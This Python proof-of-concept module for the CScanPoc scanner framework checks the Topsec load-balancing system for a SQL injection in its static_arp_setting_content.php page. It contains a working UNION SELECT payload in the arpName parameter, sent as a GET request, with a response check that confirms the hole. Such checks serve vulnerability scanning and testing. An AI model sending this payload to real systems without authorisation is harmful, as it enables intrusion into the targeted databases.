# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '06057a4a-9a2e-43b5-9042-f88408acb9dc'
    name = '天融信负载均衡系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-05'  # 漏洞公布时间
    desc = '''
        天融信负载均衡系统 /acc/bindipmac/static_arp_setting_content.php 信息泄SQL注入露洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '天融信负载均衡系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e0ab77b7-c0fa-4304-b44a-3b3214848b81'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://www.wooyun.org/bugs/wooyun-2015-0118363
            payload = '/acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            content = req.content

            if '1447200000' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
